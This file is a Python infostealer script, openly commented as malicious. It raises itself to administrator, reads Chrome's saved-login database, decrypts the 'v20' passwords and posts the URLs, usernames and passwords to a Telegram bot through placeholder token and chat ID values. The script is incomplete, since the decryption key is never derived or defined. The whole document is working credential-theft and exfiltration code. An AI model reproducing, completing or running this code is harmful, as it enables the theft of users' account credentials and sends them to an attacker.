
import os
import sys
import json
import binascii
import requests
import sqlite3
import pathlib
import time
import ctypes

# Replace with your embedded Telegram credentials or placeholders
BOT_TOKEN = '%BOT_TOKEN%'
CHAT_ID = '%CHAT_ID%'

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

if not is_admin():
    input("This script needs to run as administrator, press Enter to continue")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([sys.argv[0]] + sys.argv[1:]), None, 1)
    sys.exit()

# Your main malicious code starts here
def decrypt_password_v20(encrypted_value, key):
    try:
        password_iv = encrypted_value[3:3+12]
        encrypted_password = encrypted_value[3+12:-16]
        password_tag = encrypted_value[-16:]
        from Crypto.Cipher import AES
        password_cipher = AES.new(key, AES.MODE_GCM, nonce=password_iv)
        decrypted_password = password_cipher.decrypt_and_verify(encrypted_password, password_tag)
        return decrypted_password.decode('utf-8')
    except Exception as e:
        return f"Error decrypting password: {str(e)}"

def get_chrome_passwords():
    user_profile = os.environ['USERPROFILE']
    login_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["encrypted_key"]
    # Decrypt the key here (your existing code)...
    # For simplicity, assuming you've already decrypted the key and have it as 'key'

    # Connect to the Chrome login database
    con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    passwords = cur.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()
    con.close()

    # Filter v20 passwords
    passwords_v20 = [p for p in passwords if p[2] and p[2][:3] == b"v20"]
    
    return passwords_v20

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    requests.post(url, data=payload)

def send_long_message(text):
    max_length = 4096
    for i in range(0, len(text), max_length):
        send_telegram_message(text[i:i+max_length])

def main():
    passwords_v20 = get_chrome_passwords()
    # Assuming you've decrypted the key and assigned it to 'key'
    # Replace 'key' with your actual decryption key

    message = "\nDecrypted Chrome Passwords:\n" + ("-" * 50) + "\n"
    for p in passwords_v20:
        url_ = p[0]
        username = p[1]
        password = decrypt_password_v20(p[2], key)  # 'key' must be defined
        message += f"URL: {url_}\nUsername: {username}\nPassword: {password}\n" + ("-" * 50) + "\n"
    send_long_message(message)

if __name__ == "__main__":
    main()
